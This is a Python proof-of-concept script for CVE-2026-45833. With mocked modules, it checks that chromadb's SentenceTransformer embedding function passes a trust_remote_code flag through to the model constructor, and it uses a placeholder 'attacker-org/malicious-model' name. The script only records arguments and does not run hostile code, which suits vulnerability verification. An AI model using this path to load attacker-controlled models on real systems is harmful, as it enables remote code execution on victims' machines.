#!/usr/bin/env python3
"""CVE-2026-45833: trust_remote_code kwargs reach SentenceTransformer constructor."""
from __future__ import annotations

import importlib.util
import os
import sys
import types as _types_mod
from pathlib import Path

PROOF = Path("/tmp/iridium_proof")
REPO = os.environ.get("IRIDIUM_REPO_PATH", "/workspace")
TARGET = Path(REPO) / "chromadb/utils/embedding_functions/sentence_transformer_embedding_function.py"
if not TARGET.is_file():
    raise SystemExit(f"PROOF FAILED: target missing: {TARGET}")

_seen: dict[str, object] = {}


class _RecordingSentenceTransformer:
    def __init__(self, model_name_or_path=None, device=None, **kwargs):
        _seen["kwargs"] = dict(kwargs)
        _seen["model"] = model_name_or_path


_fake_st_pkg = _types_mod.ModuleType("sentence_transformers")
_fake_st_pkg.SentenceTransformer = _RecordingSentenceTransformer
sys.modules["sentence_transformers"] = _fake_st_pkg

_api_types = _types_mod.ModuleType("chromadb.api.types")
_api_types.Documents = list
_api_types.Embeddings = list


class _EmbeddingFunction:
    def __class_getitem__(cls, _item):
        return cls


_api_types.EmbeddingFunction = _EmbeddingFunction
_api = _types_mod.ModuleType("chromadb.api")
_api.types = _api_types
_chromadb = _types_mod.ModuleType("chromadb")
_chromadb.api = _api
sys.modules["chromadb"] = _chromadb
sys.modules["chromadb.api"] = _api
sys.modules["chromadb.api.types"] = _api_types

_spec = importlib.util.spec_from_file_location("iridium_chroma_st_ef", TARGET)
if _spec is None or _spec.loader is None:
    raise SystemExit("PROOF FAILED: unable to load embedding function module")
_module = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_module)
SentenceTransformerEmbeddingFunction = _module.SentenceTransformerEmbeddingFunction

SentenceTransformerEmbeddingFunction(
    model_name="attacker-org/malicious-model",
    device="cpu",
    normalize_embeddings=False,
    trust_remote_code=True,
)

kwargs = _seen.get("kwargs")
if not isinstance(kwargs, dict) or kwargs.get("trust_remote_code") is not True:
    raise SystemExit(f"PROOF FAILED: trust_remote_code not forwarded: {kwargs!r}")

PROOF.write_text("trust_remote_code=True forwarded\n", encoding="utf-8")
IRIDIUM_POC_SUCCESS = True
print("IRIDIUM_PROOF_CREATED")
